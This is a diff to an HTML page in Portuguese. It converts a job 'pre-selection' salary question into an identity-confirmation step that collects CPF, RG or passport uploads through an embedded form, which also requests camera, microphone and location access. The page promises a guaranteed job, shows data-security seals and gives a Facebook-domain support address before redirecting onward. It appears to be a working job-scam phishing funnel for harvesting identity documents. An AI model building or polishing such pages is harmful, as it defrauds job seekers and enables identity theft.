@@ -3,13 +3,17 @@
 <head>
   <meta charset="utf-8" />
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Pré‑seleção – Exclusividade e Salário</title>
-  <meta name="description" content="Pergunta de pré‑seleção sobre exclusividade e salário. Responda para seguir." />
+  <!-- área segura p/ notch -->
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+  <title>Pré-seleção – Confirmação de Identidade</title>
+  <meta name="description" content="Página de pré-seleção: confirme sua identidade e avance para o formulário." />
   <meta name="theme-color" content="#0ea5e9" />
+  <!-- Open Graph -->
   <meta property="og:type" content="website" />
-  <meta property="og:title" content="Pré‑seleção – Exclusividade e Salário" />
-  <meta property="og:description" content="Responda à pergunta e avance ao próximo passo." />
+  <meta property="og:title" content="Pré-seleção – Confirmação de Identidade" />
+  <meta property="og:description" content="Escolha o tipo de documento, anexe seus arquivos e avance." />
+  <meta property="og:image" content="" />
+  <meta property="og:url" content="" />
   <style>
     :root{
       --bg1:#0ea5e9; /* sky-500 */
@@ -18,6 +22,7 @@
       --text:#0f172a; /* slate-900 */
       --muted:#475569; /* slate-600 */
       --ring:#93c5fd; /* blue-300 */
+      --radius:20px;
     }
     *{box-sizing:border-box}
     html,body{height:100%}
@@ -26,14 +31,19 @@
       font-family:system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,Ubuntu,"Noto Sans",sans-serif;
       color:var(--text);
       background:linear-gradient(160deg,var(--bg1),var(--bg2)) fixed;
-      display:grid;
-      place-items:center;
+      /* topo bem enquadrado + notch safe */
+      min-height:100svh;
+      display:flex;
+      justify-content:center;
+      align-items:flex-start;
       padding:clamp(12px,2vw,28px);
+      padding-top:calc(clamp(12px,2vw,28px) + env(safe-area-inset-top,0px));
+      padding-bottom:calc(clamp(12px,2vw,28px) + env(safe-area-inset-bottom,0px));
     }
     .card{
       width:min(100%, 980px);
       background:var(--card);
-      border-radius:20px;
+      border-radius:var(--radius);
       box-shadow:0 10px 30px rgba(2,6,23,.25);
       overflow:hidden;
       border:1px solid rgba(15,23,42,.06);
@@ -45,98 +55,141 @@
       background:linear-gradient(135deg, #38bdf8, #2563eb);
       color:white;
       padding:32px 28px 24px;
+      padding-top:calc(32px + env(safe-area-inset-top,0px)); /* garante respiro no topo */
     }
-    .tag{
-      display:inline-flex;align-items:center;gap:8px;
-      background:rgba(255,255,255,.15);
-      border:1px solid rgba(255,255,255,.25);
-      padding:6px 10px;border-radius:999px;font-size:12px;letter-spacing:.2px
-    }
-    .subtitle{margin:12px 0 0;opacity:.95;font-weight:500}
+    .tag{display:inline-flex;align-items:center;gap:8px;background:rgba(255,255,255,.15);border:1px solid rgba(255,255,255,.25);padding:6px 10px;border-radius:999px;font-size:12px;letter-spacing:.2px}
+    .title{margin:12px 0 6px;font-weight:800;line-height:1.1;font-size: clamp(22px, 4.5vw, 34px)}
+    .subtitle{margin:0;opacity:.95;font-weight:500}
 
     .content{padding:22px 22px 26px}
+
+    .section{
+      border:1px solid rgba(15,23,42,.08);
+      border-radius:14px;
+      background:#f8fafc;
+      padding:22px;
+      box-shadow:0 6px 20px rgba(2,6,23,.10);
+      margin-bottom:18px
+    }
+    .section h3{margin:0 0 12px;font-size:18px}
+
+    .radios{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:10px}
+    .radio{display:flex;align-items:center;gap:10px;padding:12px;border:1px solid rgba(15,23,42,.10);border-radius:12px;background:#fff;cursor:pointer}
+    .radio input{accent-color:#2563eb;width:18px;height:18px}
+
+    .filebox{padding:14px;background:#fff;border:1px dashed rgba(15,23,42,.18);border-radius:12px}
+
+    .security{
+      display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;gap:10px;
+      background:#fff;border:1px solid rgba(15,23,42,.08);border-radius:12px;padding:18px
+    }
+    .security svg{width:64px;height:64px}
+    .security p{margin:0;font-weight:700;color:#1d4ed8}
+
+    .actions{display:flex;justify-content:flex-end}
     .btn{
-      appearance:none;border:0;cursor:pointer;
-      background:#1d4ed8;color:#fff;border-radius:10px;
-      padding:12px 18px;font-weight:800;font-size:16px;text-decoration:none;display:inline-flex;align-items:center;gap:8px
+      appearance:none;border:0;cursor:pointer;background:#1d4ed8;color:#fff;border-radius:12px;padding:12px 18px;font-weight:800;font-size:16px;display:inline-flex;align-items:center;gap:8px
     }
     .btn:hover{filter:brightness(1.05)}
     .btn:focus-visible{outline:3px solid var(--ring);outline-offset:2px}
 
-    .cta{
-      border:1px solid rgba(15,23,42,.08);
-      border-radius:14px; overflow:hidden;
-      box-shadow:0 6px 20px rgba(2,6,23,.10);
-      background:#f8fafc;
-      padding:28px;
-      text-align:center;
-    }
-    .q{font-size: clamp(18px, 3.6vw, 26px);font-weight:900;line-height:1.2;margin:0 0 18px}
-    .q small{display:block;margin-top:6px;color:var(--muted);font-weight:600}
-    .choices{display:flex;gap:12px;flex-wrap:wrap;justify-content:center}
+    .error{color:#b91c1c;font-size:13px;margin-top:10px;display:none}
 
-    .footer{padding:16px 22px 24px;color:var(--muted);font-size:12px;display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap}
+    .footer{
+      padding:16px 22px 24px;
+      color:var(--muted);
+      font-size:12px;
+      display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap
+    }
     .footer a{color:#2563eb;text-underline-offset:3px}
 
     @media (prefers-reduced-motion: reduce){*{animation:none !important;transition:none !important}}
   </style>
 </head>
-<body data-dest="https://presellemp.vercel.app/pagina1.html">
-  <main class="card" role="main" aria-labelledby="q2">
+<body data-next="https://presellemp.vercel.app/loadobg.html">
+  <main class="card" role="main" aria-labelledby="t">
     <header class="header">
       <span class="tag" aria-label="etiqueta">
-        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M7 3h7l5 5v13a1 1 0 0 1-1 1H7a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1Z" stroke="currentColor" stroke-width="1.6"/><path d="M14 3v4a1 1 0 0 0 1 1h4" stroke="currentColor" stroke-width="1.6"/></svg>
-        Pré‑seleção
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <path d="M7 3h7l5 5v13a1 1 0 0 1-1 1H7a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1Z" stroke="currentColor" stroke-width="1.6"/>
+          <path d="M14 3v4a1 1 0 0 0 1 1h4" stroke="currentColor" stroke-width="1.6"/>
+        </svg>
+        Verificação
       </span>
-      <p class="subtitle">Responda abaixo para avançar ao próximo passo.</p>
+      <h1 class="title" id="t">Perfeito, agora confirme sua identidade</h1>
+      <p class="subtitle">Este é o ultimo passo para que você possa garantir sua vaga.</p>
     </header>
 
     <section class="content">
-      <div class="cta" role="group" aria-labelledby="q2">
-        <h2 id="q2" class="q">Um salário de R$ 1.900,00 + Vale alimentação de R$ 500,00 é o suficiente para que você trabalhe conosco exclusivamente?
-          <small>Selecione uma opção para seguir.</small>
-        </h2>
-        <div class="choices">
-          <a id="ctaSim" class="btn" href="#" aria-label="Sim, é suficiente">✅ Sim</a>
-          <a id="ctaNao" class="btn" href="#" aria-label="Não, não é suficiente">❌ Não</a>
+      <!-- Tipo de documento -->
+      <div class="section" role="group" aria-labelledby="doclabel">
+        <h3 id="doclabel">Tipo de documento</h3>
+        <div class="radios">
+          <label class="radio" for="doc_cpf"><input id="doc_cpf" name="doctype" type="radio" value="CPF" /> CPF</label>
+          <label class="radio" for="doc_rg"><input id="doc_rg" name="doctype" type="radio" value="RG" /> RG</label>
+          <label class="radio" for="doc_pass"><input id="doc_pass" name="doctype" type="radio" value="PASSAPORTE" /> Passaporte</label>
         </div>
+        <div id="err" class="error" role="alert">Selecione um tipo de documento para continuar.</div>
+      </div>
+
+      <!-- Upload (trocado pelo forms.app) -->
+      <div class="section">
+        <h3>Após fazer o upload dos documentos clique no botão verificar</h3>
+        <div class="filebox">
+          <!-- EMBED forms.app -->
+          <iframe id="" allowtransparency="true" allowfullscreen="true" allow="geolocation; microphone; camera" src="https://xpwtkcmp.forms.app/form/68c2a7c258c4ae000252d085" frameborder="0" style="width: 100%; min-width:100%; height:1130px; border:none;"></iframe>
+        </div>
+      </div>
+
+      <!-- Selo de segurança -->
+      <div class="section">
+        <div class="security" aria-label="Selo de segurança de dados">
+          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+            <path d="M12 2l7 3v6c0 5-3.5 9.5-7 11-3.5-1.5-7-6-7-11V5l7-3Z" stroke="#1d4ed8" stroke-width="1.6"/>
+            <path d="M8.5 12l2.5 2.5L15.5 10" stroke="#1d4ed8" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+          <p>Seus dados estão protegidos com segurança</p>
+        </div>
+      </div>
+
+      <div class="actions">
+        <button id="send" class="btn" type="button" aria-label="Enviar e avançar">Enviar</button>
       </div>
     </section>
 
     <footer class="footer">
-      <span>🔒 Seus dados serão usados apenas para esta seleção.</span>
+      <span>🔒 Seus dados estão seguros.</span>
       <span>Suporte: <a href="mailto:trabalheconosco@facebook.com">trabalheconosco@facebook.com</a></span>
     </footer>
   </main>
 
-  <noscript>
-    <div style="max-width:980px;margin:12px auto;color:#fff;text-align:center">
-      Para continuar, ative o JavaScript ou <a style="color:#fff;text-decoration:underline" href="https://presellemp.vercel.app/pagina1.html">clique aqui</a>.
-    </div>
-  </noscript>
-
   <script>
     (function(){
-      const destBase = document.body.getAttribute('data-dest');
-      function makeFinalUrl(){
-        try{
-          const url = new URL(destBase);
-          const params = new URLSearchParams(location.search);
-          params.forEach((v,k)=>{ if(!url.searchParams.has(k)) url.searchParams.set(k,v); });
-          return url.toString();
-        }catch(e){ return destBase; }
+      const nextBase = document.body.getAttribute('data-next');
+      const btn = document.getElementById('send');
+      const err = document.getElementById('err');
+
+      function getDocType(){
+        const el = document.querySelector('input[name="doctype"]:checked');
+        return el ? el.value : null;
       }
-      const finalUrl = makeFinalUrl();
-      ['ctaSim','ctaNao'].forEach(id=>{
-        const a = document.getElementById(id);
-        if(!a) return;
-        a.removeAttribute('target');
-        a.removeAttribute('rel');
-        a.href = finalUrl; // mesma aba por padrão
-        a.addEventListener('click', function(ev){
-          ev.preventDefault();
-          location.assign(finalUrl); // força mesma aba
-        });
+
+      btn.addEventListener('click', function(){
+        const type = getDocType();
+        if(!type){
+          err.style.display = 'block';
+          return;
+        }
+        try{
+          const url = new URL(nextBase);
+          // repassa UTMs e adiciona doc_type
+          const paramsHere = new URLSearchParams(window.location.search);
+          paramsHere.forEach((v,k)=>{ if(!url.searchParams.has(k)) url.searchParams.set(k,v); });
+          url.searchParams.set('doc_type', type);
+          window.location.assign(url.toString()); // mesma aba
+        }catch(e){
+          window.location.assign(nextBase);
+        }
       });
     })();
   </script>
